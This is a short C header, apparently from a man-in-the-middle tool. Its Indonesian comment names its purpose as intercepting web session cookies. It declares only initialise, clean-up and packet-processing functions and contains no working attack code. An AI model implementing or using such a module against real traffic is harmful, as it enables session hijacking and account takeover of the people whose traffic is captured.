// ============================================================================
// HEADER: mitm/session_hijack.h — Penyadapan Cookie Sesi Web
// ============================================================================
#ifndef SESSION_HIJACK_H
#define SESSION_HIJACK_H

#include "../config.h"

int session_hijack_init(void);
void session_hijack_cleanup(void);
int session_hijack_process(const uint8_t *data, int len);

#endif // SESSION_HIJACK_H
